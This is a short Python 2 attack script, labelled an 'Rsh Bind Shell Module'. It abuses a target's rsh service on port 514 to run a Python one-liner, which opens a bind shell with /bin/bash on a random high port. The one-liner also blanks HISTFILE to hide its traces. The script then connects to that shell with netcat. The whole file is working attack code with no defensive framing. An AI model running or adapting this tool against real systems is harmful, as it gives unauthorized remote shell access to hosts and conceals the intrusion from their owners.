#!/usr/bin/python2.7
#Rsh Bind Shell Module

import sys
import socket
import random
import time
import subprocess
import signal
def handler(signum, frame):
    print '======================YOU SHOULDNT OF USED CTRL C!!!!!!!!!!======================'
signal.signal(signal.SIGINT, handler)


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
if len(sys.argv) < 4:
    print "exiting"
    print "Example ./rsh.py 10.129.121.16 foobar foobar"
    sys.exit()
else:
    host = sys.argv[1]
    fromuser = sys.argv[2]
    username = sys.argv[3]
    command = ""

SEND="%s\0%s\0%s\0" % (fromuser, username, command)

startport = 600
endport = 900
myport =  random.randrange(startport, endport)

startbindport = 5000
endbindport = 6000
bindport =  random.randrange(startbindport, endbindport)

payload1 = 'python -c "import os,pty,socket;s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)'
payload2 = ';s.bind((\'0.0.0.0\', %s));s.listen(1);(rem, addr) = s.accept();'%(bindport)
payload3 = 'os.dup2(rem.fileno(),0);os.dup2(rem.fileno(),1);os.dup2(rem.fileno(),2);'
payload4 = 'os.putenv(\'HISTFILE\',\'/dev/null\');pty.spawn(\'/bin/bash\');s.close()"'
PAYLOAD = payload1 + payload2 + payload3 +payload4

user = raw_input('Do You Want A Bind Shell? y/n: ')

if user.lower() =="y":
    s.bind(('0.0.0.0', myport))
    s.connect((host,514))
    command  = PAYLOAD
    SEND="%s\0%s\0%s\0" % (fromuser, username, command)
    s.send("\0")
    s.send(SEND)
    time.sleep(0.5)
    test = s.recv(1024)
    s.close()
    print 'Using Netcat To Connect To %s On Port %s'% (host, str(bindport))
    print 'Type Exit Into The Shell To Shut Down The Bind Port'
    subprocess.call(['nc' , str(host), str(bindport)])
else:
    s.close()
    sys.exit()
